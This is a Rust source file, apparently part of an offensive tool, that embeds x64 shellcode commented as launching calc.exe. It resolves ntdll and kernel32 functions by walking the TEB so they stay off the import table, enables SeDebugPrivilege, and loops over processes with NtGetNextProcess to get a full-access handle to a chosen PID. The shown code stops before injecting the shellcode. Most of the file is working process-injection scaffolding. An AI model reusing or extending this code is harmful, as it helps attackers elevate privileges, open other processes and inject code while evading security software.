use winapi::{
    shared::{
        minwindef::{BOOL, DWORD, FARPROC},
        ntdef::{HANDLE, NTSTATUS, OBJECT_ATTRIBUTES},
    },
    um::winnt::{ACCESS_MASK, MAXIMUM_ALLOWED},
};

use noldr::*;

//shellcode for popping calc

pub const SHELL_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

// Get NtGetNextProcess function pointer
type NtGetNextProcessFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    DesiredAccess: u32,
    HandleAttributes: u32,
    Flags: u32,
    NewProcessHandle: *mut HANDLE,
) -> i32;

// Update the type definition
type GetModuleFileNameWFn =
    unsafe extern "system" fn(hModule: HANDLE, lpFilename: *mut u16, nSize: u32) -> u32;

type GetCurrentProcessFn = unsafe extern "system" fn() -> HANDLE;

// Update the type definition to match exactly with Windows API
type OpenProcessTokenFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    DesiredAccess: DWORD,
    TokenHandle: *mut HANDLE,
) -> BOOL;

// Add this type definition near your other ones
type NtOpenProcessTokenFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    DesiredAccess: ACCESS_MASK,
    TokenHandle: *mut HANDLE,
) -> NTSTATUS;

// Add these type definitions at the top
#[repr(C)]
struct TOKEN_PRIVILEGES {
    PrivilegeCount: u32,
    Privileges: [LUID_AND_ATTRIBUTES; 1],
}

#[repr(C)]
struct LUID {
    LowPart: u32,
    HighPart: i32,
}

#[repr(C)]
struct LUID_AND_ATTRIBUTES {
    Luid: LUID,
    Attributes: u32,
}

const SE_PRIVILEGE_ENABLED: u32 = 0x00000002;

type NtAdjustPrivilegesTokenFn = unsafe extern "system" fn(
    TokenHandle: HANDLE,
    DisableAllPrivileges: BOOL,
    NewState: *const TOKEN_PRIVILEGES,
    BufferLength: u32,
    PreviousState: *mut TOKEN_PRIVILEGES,
    ReturnLength: *mut u32,
) -> NTSTATUS;

const MAX_PATH: usize = 260;
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const TOKEN_QUERY: u32 = 0x0008;

// Add near your other type definitions
type NtCloseFn = unsafe extern "system" fn(Handle: HANDLE) -> NTSTATUS;

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 2 {
        println!("Usage: {} <pid>", args[0]);
        return;
    }

    let target_pid: u32 = match args[1].parse() {
        Ok(pid) => pid,
        Err(_) => {
            println!("Error: PID must be a valid number");
            return;
        }
    };

    println!("[+] Targeting PID {}", target_pid);
    locate_process(target_pid).unwrap();
}

fn locate_process(target_pid: u32) -> Result<(), Box<dyn std::error::Error>> {
    let teb = noldr::get_teb();
    println!("[+] TEB address: {:?}", teb);

    let ntdll = noldr::get_dll_address("ntdll.dll".to_string(), teb).unwrap();
    println!("[+] ntdll.dll address: {:?}", ntdll);

    let kernel32 = noldr::get_dll_address("kernel32.dll".to_string(), teb).unwrap();
    println!("[+] kernel32.dll address: {:?}", kernel32);

    //locate NtOpenProcessToken
    let nt_open_process_token = noldr::get_function_address(ntdll, "NtOpenProcessToken")
        .unwrap_or_else(|| std::ptr::null_mut());

    if nt_open_process_token.is_null() {
        println!("[!] Failed to get NtOpenProcessToken address");
        return Err("NtOpenProcessToken address is null".into());
    }
    println!(
        "[+] NtOpenProcessToken address: {:?}",
        nt_open_process_token
    );

    // Print first few bytes to verify it's not forwarded
    unsafe {
        let bytes = std::slice::from_raw_parts(nt_open_process_token as *const u8, 16);
        println!("[*] First bytes of NtOpenProcessToken: {:02x?}", bytes);
    }

    let nt_open_process_token: NtOpenProcessTokenFn =
        unsafe { std::mem::transmute(nt_open_process_token) };

    let mut token_handle: HANDLE = std::ptr::null_mut();

    let get_process_id = noldr::get_function_address(kernel32, "GetProcessId")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] GetProcessId address: {:?}", get_process_id);

    let get_current_process = noldr::get_function_address(kernel32, "GetCurrentProcess")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] GetCurrentProcess address: {:?}", get_current_process);

    let current_process: GetCurrentProcessFn = unsafe { std::mem::transmute(get_current_process) };

    type GetProcessIdFn = unsafe extern "system" fn(HANDLE) -> u32;
    let get_process_id: GetProcessIdFn = unsafe { std::mem::transmute(get_process_id) };

    println!("[*] Debug - About to call NtOpenProcessToken");
    let status = unsafe {
        println!("[*] About to make the call");
        let result = nt_open_process_token(
            current_process(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        );
        println!("[*] Call completed");
        result
    };

    if status != 0 {
        println!("[!] NtOpenProcessToken failed with status: {}", status);
        return Err("Failed to open process token".into());
    }

    if token_handle.is_null() {
        println!("[!] Token handle is null despite successful call");
        return Err("Received null token handle".into());
    }

    println!("[+] Successfully opened process token: {:?}", token_handle);

    // SeDebugPrivilege LUID
    let luid = LUID {
        LowPart: 20,  // SeDebugPrivilege
        HighPart: 0,
    };
    println!("[*] Created LUID: LowPart={}, HighPart={}", luid.LowPart, luid.HighPart);

    let mut priv_struct = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };
    println!("[*] Created TOKEN_PRIVILEGES structure with {} privilege(s)", priv_struct.PrivilegeCount);

    let nt_adjust_privileges_token = noldr::get_function_address(ntdll, "NtAdjustPrivilegesToken")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] NtAdjustPrivilegesToken address: {:?}", nt_adjust_privileges_token);

    let status = unsafe {
        let nt_adjust_privileges_token: NtAdjustPrivilegesTokenFn = std::mem::transmute(nt_adjust_privileges_token);
        println!("[*] Attempting to adjust token privileges...");
        nt_adjust_privileges_token(
            token_handle,
            0,
            &priv_struct,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    if status != 0 {
        println!("[!] NtAdjustPrivilegesToken failed with status code: {:#x}", status);
        return Err("Failed to adjust token privileges".into());
    }

    println!("[+] Successfully enabled SeDebugPrivilege!");

    // After you're done with the token_handle:
    let nt_close = noldr::get_function_address(ntdll, "NtClose")
        .unwrap_or_else(|| std::ptr::null_mut());

    let status = unsafe {
        let nt_close: NtCloseFn = std::mem::transmute(nt_close);
        nt_close(token_handle)
    };

    if status != 0 {
        println!("[!] NtClose failed with status: {}", status);
        return Err("Failed to close token handle".into());
    }

    println!("[+] Successfully closed token handle");

    let nt_get_next_process = noldr::get_function_address(ntdll, "NtGetNextProcess")
        .unwrap_or_else(|| std::ptr::null_mut());
    println!("[+] NtGetNextProcess address: {:?}", nt_get_next_process);

    let mut handle: HANDLE = std::ptr::null_mut();
    let mut target_handle: HANDLE = std::ptr::null_mut();

    while unsafe {
        std::mem::transmute::<_, NtGetNextProcessFn>(nt_get_next_process)(
            handle,
            MAXIMUM_ALLOWED,
            0,
            0,
            &mut handle,
        )
    } == 0
    {
        let pid = unsafe { get_process_id(handle) };
        //println!("[*] Checking PID: {}", pid);

        if pid == target_pid {
            println!("[+] Found target process");
            target_handle = handle;
            break;
        }
    }

    println!("[+] Target process handle: {:?}", target_handle);

    Ok(())
}

/*
fn elevate_debug() -> Result<(), Box<dyn std::error::Error>> {

}
*/
